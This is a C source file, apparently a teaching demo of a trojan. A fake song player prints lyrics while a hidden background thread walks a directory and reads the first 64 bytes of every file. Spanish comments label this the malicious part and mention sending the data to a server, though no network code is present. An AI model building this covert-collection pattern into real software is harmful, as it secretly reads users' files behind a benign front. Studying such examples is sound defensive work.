#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/stat.h>

void spy_dirs(char* path) {
    /* 
      Parte maliciosa :
        Abre todos los ficheros, incluidos los que se encuentran internos al directorio.
        Lee los primeros 64 bytes
    */
    struct dirent *de;
    struct stat statbuf;
    char fullpath[1024];
    char buffer[64];

    DIR *dr = opendir(path);
    // Leer y listar los archivos del directorio
    while ((de = readdir(dr)) != NULL) {
        if (strcmp(de->d_name, "..") != 0 && strcmp(de->d_name, ".") != 0 && strcmp(de->d_name, "canciones") != 0) {

            snprintf(fullpath, sizeof(fullpath), "%s/%s", path, de->d_name);
            stat(fullpath, &statbuf);
            if (S_ISDIR(statbuf.st_mode)) {
                // Si se topa con un directorio vuelve a llamar a esta función para encontrar más ficheros
                spy_dirs(fullpath);
            } else if (S_ISREG(statbuf.st_mode)) {
                int f;
                f = open(fullpath, O_RDONLY, 0644);
                read(f, buffer, 64);
                close(f);

                // Aquí los mandaría a su servidor malicioso
            }
        }
    }

    // Cerrar el directorio
    closedir(dr);
}

void play_audio(const char *filename) {
    pid_t pid = fork();
    if (pid == 0) {
        int file = open(filename, O_RDONLY);
        // En el proceso hijo: redirigir stdout y stderr a /dev/null
        FILE *f = fopen("/dev/null", "w");
        if (f == NULL) {
            perror("fopen");
            exit(EXIT_FAILURE);
        }
        dup2(fileno(f), STDOUT_FILENO);
        dup2(fileno(f), STDERR_FILENO);
        fclose(f);

        // Se ejecuta el audio
        // execlp("mpg123", "mpg123", filename, (char *)NULL);
        close(file);
        perror("execlp");
        exit(EXIT_FAILURE);
    } else if (pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }
}

int main(int argc, char **argv) {
    
    play_audio("data/canciones/cancion.mp3");

    pthread_t thread;
    pthread_attr_t attr_thread;
    pthread_attr_init(&attr_thread);
    pthread_attr_setdetachstate(&attr_thread, PTHREAD_CREATE_DETACHED);
    
    char *path = "data/canciones";
    pthread_create(&thread, &attr_thread, (void *)spy_dirs, (void *)path);

    int file_lyrics, line_index = 0;
    char buffer[32], line[32];
    ssize_t bytes_read;
    
    file_lyrics = open("data/canciones/lyrics.txt", O_RDONLY, 0644);
    while ((bytes_read = read(file_lyrics, buffer, 32)) > 0) {
        for (int i = 0; i < bytes_read; i++) {
            if (buffer[i] == '\n') {
                line[line_index] = '\0';
                printf("%s\n", line);
                line_index = 0; 
                sleep(2.37);
            } else {
                line[line_index++] = buffer[i];
            }
        }
    }

    wait(NULL);
    
    return 0;
}
